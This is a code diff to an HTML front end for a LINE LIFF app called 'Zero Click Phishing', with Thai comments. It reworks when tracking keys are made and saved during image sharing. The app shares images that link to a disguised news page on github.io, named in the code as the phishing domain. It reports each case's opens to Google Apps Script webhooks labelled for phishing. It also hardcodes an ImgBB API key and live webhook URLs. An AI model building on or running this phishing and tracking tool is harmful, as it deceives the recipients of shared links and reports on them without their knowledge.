@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zero Click Phishing - LIFF</title>
+    <title>Zero Click Phishing</title>
     <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;700&display=swap" rel="stylesheet">
     <!-- Line LIFF SDK -->
     <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
@@ -328,10 +328,9 @@
             <div id="mainForm">
                 <div class="form-group">
                     <label for="caseName">ชื่อเคส</label>
-                    <div class="input-group">
-                        <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
-                        <button id="generateTrackingBtn" title="สร้าง Tracking Key อัตโนมัติ">⚡</button>
-                    </div>
+                    <!-- Removed the input-group and button -->
+                    <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
+                    <!-- <button id="generateTrackingBtn" title="สร้าง Tracking Key อัตโนมัติ">⚡</button> -->
                 </div>
                 
                 <div class="form-group">
@@ -360,7 +359,7 @@
         </div>
         
         <div class="footer">
-            &copy; 2025 Zero Click Phishing System - LINE LIFF
+            &copy; 2025 Zero Click Phishing - Dectective-X
         </div>
     </div>
 
@@ -380,8 +379,8 @@
         const IMGBB_API_KEY = '0854e4f08da46fb35f126bdf17984657'; // ใส่ API key ของ ImgBB
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
-        const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw0kjeWVtkX4QtHSdjKAW2DhxOMNH3TwGWqbw_V0KAB3vq_ocWwXARZiL9b2MqiWWtsQg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxV4ziikt11WXEgzh6ufwlMixCk0B1cIsQWodXI7jX2KF5HVv48cwAq1FuINwtMKtUliQ/exec'; // ไฟล์ GoogleScript.html
+        const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxUe1tLDn14DE-rBkYQbpO3lT044HOndleNl6Px1avQ7ZhMSI6LBZb0hhMWI6Fl_Smvrw/exec'; // ไฟล์ LineOA.html
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw0Ta_O2PzMOa197aEv-icC2FBUK1aMLTTaiXlh9bYlTvL9Ig9o8n7apVekwzmvUe6S2A/exec'; // ไฟล์ GoogleScript.html
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -532,13 +531,8 @@
             document.getElementById('imageUpload').addEventListener('change', handleImageSelect);
             
             // ปุ่มสร้าง Tracking Key
-            document.getElementById('generateTrackingBtn').addEventListener('click', function() {
-                if (!userHasPermission) {
-                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
-                    return;
-                }
-                generateTrackingKey();
-            });
+            // Removed event listener for generateTrackingBtn
+            // document.getElementById('generateTrackingBtn').addEventListener('click', function() { ... });
             
             // ปุ่มแชร์รูปภาพ
             document.getElementById('shareBtn').addEventListener('click', function() {
@@ -712,11 +706,10 @@
             }
             
             trackingKey = timestamp + '-' + randomPart;
+            // บันทึก Tracking Key และ Case Name จะถูกย้ายไปทำหลังแชร์สำเร็จ
+            // saveTrackingCaseMapping(trackingKey, caseName); // <-- Removed from here
             
-            // บันทึก Tracking Key และ Case Name (ใช้ GoogleScript.html)
-            saveTrackingCaseMapping(trackingKey, caseName);
-            
-            showStatus(`Tracking Key สร้างสำเร็จ: ${trackingKey}`, true);
+            showStatus(`Tracking Key สร้างสำเร็จ: ${trackingKey}`, true); // Keep status message
             
             // ตรวจสอบว่าสามารถแชร์ได้หรือไม่
             checkCanShare();
@@ -790,11 +783,15 @@
                 return;
             }
             
-            if (!trackingKey) {
-                // สร้าง Tracking Key หากยังไม่มี
-                generateTrackingKey();
-            }
+            // สร้าง Tracking Key อัตโนมัติทุกครั้งที่กดแชร์
+            generateTrackingKey(); 
             
+            // ตรวจสอบว่ามี trackingKey หรือไม่หลังจากการสร้าง
+            if (!trackingKey) {
+                 showStatus('ไม่สามารถสร้าง Tracking Key ได้', false);
+                 return; // หยุดการทำงานถ้าสร้าง Key ไม่สำเร็จ
+            }
+
             try {
                 // อัพโหลดรูปภาพ
                 imageUrl = await uploadImage();
@@ -866,10 +863,13 @@
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
                         
-                        // ส่งข้อมูลการเปิดดูแรก (Zero Click) หลังจากแชร์สำเร็จแล้ว
-                        sendZeroClickNotification(trackingKey, caseName); // <-- ย้ายมาตรงนี้
+                        // 1. บันทึก Tracking Key Mapping ก่อนส่ง Notification
+                        await saveTrackingCaseMapping(trackingKey, caseName); 
                         
-                        // รีเซ็ตหน้าจอ
+                        // 2. ส่งข้อมูลการเปิดดูแรก (Zero Click) หลังจากแชร์สำเร็จแล้ว
+                        sendZeroClickNotification(trackingKey, caseName); 
+                        
+                        // 3. รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
                         showStatus('การแชร์ถูกยกเลิก', false);
